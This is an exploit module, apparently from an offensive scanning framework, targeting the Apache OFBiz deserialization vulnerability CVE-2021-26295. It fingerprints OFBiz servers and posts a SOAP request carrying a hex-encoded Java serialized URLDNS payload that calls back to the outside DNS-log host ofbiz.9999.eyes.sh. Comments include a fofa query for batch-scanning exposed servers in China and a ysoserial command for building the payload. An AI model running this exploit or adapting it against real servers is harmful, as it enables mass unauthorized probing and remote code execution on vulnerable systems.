# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-14 13:40

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: app="Apache_OFBiz"
# python batch.py -m exploit.scripts.Apache.OFBiz.unauth_rce -cs -fs "app=\"Apache_OFBiz\" && country=\"CN\""

class Script(BaseScript):
    name = 'Apache OFBiz'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = 'CVE-2021-26295'
        # 来源
        self.bug_refer = 'https://xz.aliyun.com/t/9345'
        # 特定路径判断
        self.detect_path_list = ['/myportal/control/main']
        # exec
        self.exec_path_list = ['/webtools/control/SOAPService']
        # 相关信息
        self.info = '''Apache OFBiz在17.12.06 版本之前的XMLRPC接口存在一处反序列化漏洞，攻击者利用这个漏洞可以在目标服务器上执行任意命令。 version < 17.12.06 ,payload -> java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://ofbiz.9999.eyes.sh | xxd -plain'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'ofbiz.apache.org' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'text/xml'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = """
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">  
                  <soapenv:Header/>  
                  <soapenv:Body>
                    <ser>
                      <map-Map>
                        <map-Entry> 
                          <map-Key>
                            <cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff7400126f6662697a2e393939392e657965732e736874000071007e0005740004687474707078740019687474703a2f2f6f6662697a2e393939392e657965732e736878</cus-obj>
                          </map-Key>
                          <map-Value>
                            <std-String value="http://ofbiz.9999.eyes.sh"/>
                          </map-Value>
                        </map-Entry>
                      </map-Map>
                    </ser>
                  </soapenv:Body>
                </soapenv:Envelope>
                """
                async with session.post(url=url, headers=headers, timeout=self.req_timeout, data=data, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        await asyncio.sleep(2)
                        text = await eyes_dnslog_verify('dns', 'ofbiz')
                        if text is not None and text:
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                            return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(Script('https://192.168.4.137:8443').attack())